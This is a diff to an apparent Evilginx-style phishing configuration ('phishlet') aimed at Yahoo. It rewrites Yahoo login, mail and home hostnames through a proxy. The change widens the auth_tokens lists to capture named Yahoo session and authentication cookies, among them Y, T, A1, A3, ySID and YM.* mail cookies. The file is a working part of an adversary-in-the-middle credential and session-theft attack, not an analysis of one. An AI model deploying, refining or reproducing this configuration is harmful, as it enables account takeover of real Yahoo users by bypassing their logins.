@@ -54,11 +54,13 @@ sub_filters:
   - {triggers_on: 'udc.yahoo.com', orig_sub: 'udc', domain: 'yahoo.com', search: 'ads.yahoo.com', replace: 'login.{domain}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
 auth_tokens:
   - domain: '.yahoo.com'
-    keys: ['.*,regexp']
+    keys: ['_ga_MQBT164R4Q', 'gpp', 'gpp_sid', '_ga', 'tbla_id', 'Y', 'F', 'PH', 'OTH', 'T', 'ySID', 'cmp', 'GUC', 'GUCS', 'A1', 'A3', 'A1S', 'OTHD', '_ebd', '_ga_P9C3W3ESF1', 'axids', '.*,regexp']
   - domain: 'mail.yahoo.com'
-    keys: ['.*,regexp']
+    keys: ['YM.SSRBDGT', 'YM.CLIENT.PARAMS', 'YM.TZ', 'Y','_ebd', '.*,regexp']
   - domain: 'login.yahoo.com'
-    keys: ['.*,regexp']
+    keys: ['F', 'Y','_ebd', 'A1', 'A3', 'OTH', 'FS', 'AS', '.*,regexp'] 
+  - domain: 'www.yahoo.com'
+    keys: ['yhome-viper', '_pn_VeDdbf58', 'AWSALBTG', 'AWSALBTGCORS', '.*,regexp']
   - domain: 'guce.yahoo.com'
     keys: ['.*,regexp']
   - domain: 'udc.yahoo.com'
